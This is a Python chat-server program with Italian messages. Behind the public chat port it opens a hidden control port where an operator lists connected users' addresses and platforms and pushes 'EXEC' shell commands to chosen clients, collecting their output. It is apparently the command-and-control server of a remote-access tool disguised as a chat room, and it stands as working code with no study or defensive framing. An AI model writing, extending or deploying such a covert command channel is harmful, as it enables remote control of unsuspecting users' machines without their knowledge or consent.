import socket
import threading
import random
import string
import platform
import time
from queue import Queue
import json

def generate_random_name():
    adjectives = ['Velocce', 'Saggio', 'Astuto', 'Gentile', 'Coraggioso', 
                 'Divertente', 'Misterioso', 'Brillante']
    nouns = ['Gatto', 'Cane', 'Leone', 'Aquila', 'Delfino', 'Fenice', 'Drago', 'Lupo']
    return f"{random.choice(adjectives)}_{random.choice(nouns)}_{''.join(random.choices(string.digits, k=2))}"

class ChatServer:
    def __init__(self):
        self.host = '0.0.0.0'
        self.chat_port = 55555
        self.control_port = 4343
        self.clients = {}  # {socket: (addr, nickname, platform, ncat_port, last_active)}
        self.control_clients = {}  # {socket: (addr, output_queue)}
        self.lock = threading.Lock()
        self.message_queue = Queue()

    def start(self):
        chat_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        chat_server.bind((self.host, self.chat_port))
        chat_server.listen()
        
        control_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        control_server.bind((self.host, self.control_port))
        control_server.listen()
        
        print(f"Server chat in ascolto su {self.host}:{self.chat_port}")
        print(f"Server controllo in ascolto su {self.host}:{self.control_port}")
        
        chat_thread = threading.Thread(target=self.accept_connections, args=(chat_server, self.handle_chat_client))
        chat_thread.start()
        
        control_thread = threading.Thread(target=self.accept_connections, args=(control_server, self.handle_control_client))
        control_thread.start()
        
        message_thread = threading.Thread(target=self.process_message_queue)
        message_thread.start()

    def accept_connections(self, server, handler):
        try:
            while True:
                client_socket, client_addr = server.accept()
                thread = threading.Thread(target=handler, args=(client_socket, client_addr))
                thread.start()
        except KeyboardInterrupt:
            server.close()

    def process_message_queue(self):
        while True:
            message, sender = self.message_queue.get()
            with self.lock:
                for client_socket in self.clients.keys():
                    try:
                        if client_socket != sender:
                            client_socket.send(message.encode('utf-8'))
                    except:
                        self.remove_client(client_socket)
            self.message_queue.task_done()

    def handle_chat_client(self, client_socket, client_addr):
        try:
            # Ricevi le informazioni su Ncat
            ncat_info = client_socket.recv(1024).decode('utf-8').strip()
            ncat_port = int(ncat_info.split(':')[1]) if ncat_info.startswith('NCAT_PORT:') else None
            
            nickname = generate_random_name()
            client_platform = platform.system()
            
            with self.lock:
                self.clients[client_socket] = (client_addr, nickname, client_platform, ncat_port, time.time())
            
            welcome_msg = f"Benvenuto nel server! Il tuo nome è: {nickname}\n"
            client_socket.send(welcome_msg.encode('utf-8'))
            
            join_msg = f"{nickname} si è unito alla chat!\n"
            self.message_queue.put((join_msg, client_socket))
            print(f"{nickname} ({client_platform}) si è connesso da {client_addr}")
            
            while True:
                message = client_socket.recv(4096).decode('utf-8')
                if not message:
                    break
                
                with self.lock:
                    self.clients[client_socket] = (client_addr, nickname, client_platform, ncat_port, time.time())
                
                if message.startswith("EXEC_RESULT:"):
                    # Inoltra il risultato al controller
                    try:
                        result_data = json.loads(message[12:])
                        self.forward_exec_result(result_data)
                    except json.JSONDecodeError:
                        pass
                elif message.startswith('/nick '):
                    new_nick = message[6:].strip()
                    with self.lock:
                        old_nick = self.clients[client_socket][1]
                        self.clients[client_socket] = (client_addr, new_nick, client_platform, ncat_port, time.time())
                        nickname = new_nick
                    nick_msg = f"{old_nick} ha cambiato nome in {new_nick}\n"
                    self.message_queue.put((nick_msg, client_socket))
                else:
                    full_message = f"{nickname}> {message}\n"
                    self.message_queue.put((full_message, client_socket))
                    print(full_message.strip())
        except:
            pass
        
        self.remove_client(client_socket)

    def forward_exec_result(self, result_data):
        with self.lock:
            for control_socket, (addr, output_queue) in self.control_clients.items():
                try:
                    output_queue.put(json.dumps(result_data))
                except:
                    pass

    def handle_control_client(self, client_socket, client_addr):
        output_queue = Queue()
        with self.lock:
            self.control_clients[client_socket] = (client_addr, output_queue)
        
        print(f"Nuova connessione di controllo da {client_addr}")
        
        output_thread = threading.Thread(target=self.send_control_output, args=(client_socket, output_queue))
        output_thread.start()
        
        try:
            self.send_client_list(client_socket)
            
            while True:
                command = client_socket.recv(1024).decode('utf-8').strip()
                if not command:
                    break
                
                if command.lower() == 'refresh':
                    self.send_client_list(client_socket)
                elif command.lower().startswith('exec '):
                    self.handle_exec_command(client_socket, command)
                elif command.lower().startswith('kick '):
                    self.handle_kick_command(client_socket, command)
                else:
                    output_queue.put("Comandi disponibili:\nrefresh - Aggiorna lista client\nexec <n> <cmd> - Esegui comando\nkick <nome> - Disconnette client\nexit - Esci\nShell> ")
        except:
            pass
        
        with self.lock:
            if client_socket in self.control_clients:
                del self.control_clients[client_socket]
        output_queue.put("TERMINATE")
        client_socket.close()
        print(f"Connessione di controllo chiusa con {client_addr}")

    def handle_exec_command(self, control_socket, command):
        parts = command.split(' ', 2)
        if len(parts) != 3:
            if control_socket in self.control_clients:
                self.control_clients[control_socket][1].put("Formato comando errato. Usa: exec <num> <comando>\nShell> ")
            return

        try:
            client_num = int(parts[1])
            cmd = parts[2]
            
            with self.lock:
                clients = list(self.clients.items())
                if 1 <= client_num <= len(clients):
                    target_socket, (addr, nick, plat, ncat_port, last_active) = clients[client_num-1]
                    target_socket.send(f"EXEC:{cmd}".encode('utf-8'))
                    
                    if control_socket in self.control_clients:
                        self.control_clients[control_socket][1].put(f"Comando inviato a {nick}\nShell> ")
                else:
                    if control_socket in self.control_clients:
                        self.control_clients[control_socket][1].put(f"Numero client non valido. Usa un numero tra 1 e {len(clients)}\nShell> ")
        except ValueError:
            if control_socket in self.control_clients:
                self.control_clients[control_socket][1].put("Il numero client deve essere un valore numerico\nShell> ")

    def handle_kick_command(self, control_socket, command):
        parts = command.split(' ', 1)
        if len(parts) != 2:
            if control_socket in self.control_clients:
                self.control_clients[control_socket][1].put("Formato comando errato. Usa: kick <nome>\nShell> ")
            return

        client_name = parts[1]
        kicked = False
        
        with self.lock:
            for sock, (addr, nick, plat, ncat_port, last_active) in list(self.clients.items()):
                if nick.lower() == client_name.lower():
                    try:
                        sock.send("Sei stato disconnesso dall'amministratore".encode('utf-8'))
                        sock.close()
                        del self.clients[sock]
                        kicked = True
                        
                        # Notifica tutti i control clients
                        for sock, (addr, q) in self.control_clients.items():
                            q.put(f"Client {nick} disconnesso\nShell> ")
                        
                        print(f"Client {nick} kickato da {addr}")
                        break
                    except Exception as e:
                        print(f"Errore durante il kick: {str(e)}")
        
        if not kicked and control_socket in self.control_clients:
            self.control_clients[control_socket][1].put(f"Client {client_name} non trovato\nShell> ")

    def send_control_output(self, client_socket, output_queue):
        try:
            while True:
                output = output_queue.get()
                if output == "TERMINATE":
                    break
                try:
                    client_socket.send(output.encode('utf-8'))
                except:
                    break
                output_queue.task_done()
        except:
            pass

    def send_client_list(self, control_socket):
        with self.lock:
            clients_list = []
            for i, (sock, (addr, nick, plat, ncat_port, last_active)) in enumerate(self.clients.items(), 1):
                clients_list.append(f"[{i}] {addr[0]}:{addr[1]} - {plat} - {nick}")
            
            message = "[!] Clients:\n" + "\n".join(clients_list) + "\n\nComandi disponibili:\nexec <num> <cmd> - Esegui comando\nkick <nome> - Disconnette client\nrefresh - Aggiorna lista\nShell> "
            if control_socket in self.control_clients:
                self.control_clients[control_socket][1].put(message)

    def remove_client(self, client_socket):
        with self.lock:
            if client_socket in self.clients:
                addr, nickname, plat, ncat_port, last_active = self.clients[client_socket]
                leave_msg = f"{nickname} ha lasciato la chat.\n"
                self.message_queue.put((leave_msg, client_socket))
                print(f"{nickname} si è disconnesso")
                del self.clients[client_socket]
                client_socket.close()

    def close_all(self):
        with self.lock:
            for client in self.clients.keys():
                client.close()
            for control, (addr, output_queue) in self.control_clients.items():
                output_queue.put("TERMINATE")
                control.close()

if __name__ == "__main__":
    server = ChatServer()
    try:
        server.start()
    except KeyboardInterrupt:
        print("\nSpegnimento del server...")
        server.close_all()
